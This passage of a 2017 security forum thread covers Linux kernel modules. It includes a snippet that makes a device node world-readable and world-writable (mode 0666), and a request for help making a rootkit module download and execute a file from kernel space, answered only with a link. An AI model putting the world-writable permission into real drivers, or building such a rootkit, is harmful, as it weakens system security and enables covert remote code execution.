<meta itemprop="dateModified" content="2017-06-04T13:52:34Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I try to set permission in my LKM with this little piece of code and it works perfectly :</p>
<h2>// set permission for all users in read and write (stop cmd chmod 0666 in dev device)<br>
static int uevent(struct device *dev, struct kobj_uevent_env *env){<br>
add_uevent_var(env, “DEVMODE=%<span class="hashtag">#o</span>”, 0666);<br>
return 0;<br>
}<br>
insert this function before the init function start</h2>
<p>insert this code after your own register device class :</p>
<p>pwnedClass-&gt;dev_uevent = uevent;</p>
<p>in my case pwanedClass is my class name.<br>
I hope this will help you <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-06-04T16:33:43Z" class="post-time">
June 4, 2017, 4:33pm
</time>
<meta itemprop="dateModified" content="2017-06-04T16:33:43Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for sharing this <a class="mention" href="https://0x00sec.org/u/pwned08000202">@Pwned08000202</a> … very good!</p>
<p>I’ve to update my code!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pwned08000202"><span itemprop="name">Pwned08000202</span></a>
(0xffxd)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-09T15:09:05Z" class="post-time">
July 9, 2017, 3:09pm
</time>
<meta itemprop="dateModified" content="2017-07-09T15:09:05Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi everyone,</p>
<p>Maybe you could help me</p>
<p>After a lot of tries and search I did not find the way to execute commands in the userspace from the kernelspace (for a school project I wanted to do a LKM rootkit)</p>
<p>My goal is to download a file and run it from my kernel module</p>
<p>I know it’s a bad idea but it’s just for educational purposes</p>
<p>Have you ever tried to do this ?</p>
<p>Thanks in advance <img src="../../images/emoji/twitter/slightly_smiling_face.png%3Fv=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-09T15:21:50Z" class="post-time">
July 9, 2017, 3:21pm
</time>
<meta itemprop="dateModified" content="2017-07-09T15:21:50Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Never tried that, but you can take a look to this:</p>
<p><a href="https://kernelnewbies.org/KernelProjects/usermode-helper-enhancements" class="onebox" target="_blank" rel="nofollow noopener">https://kernelnewbies.org/KernelProjects/usermode-helper-enhancements</a></p>
<p>No idea what is the status in recent kernels</p>
<p>Hope that helps</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_13" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Pwned08000202"><span itemprop="name">Pwned08000202</span></a>
(0xffxd)
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-09T15:32:24Z" class="post-time">
July 9, 2017, 3:32pm
</time>
<meta itemprop="dateModified" content="2017-07-09T15:32:24Z">
<span itemprop="position">13</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for your reply!</p>
<p>I look at this</p>
<p>If I find a solution I will post it here</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="1485.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:42:22Z" class="post-time">
January 21, 2018, 12:42am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:42:22Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
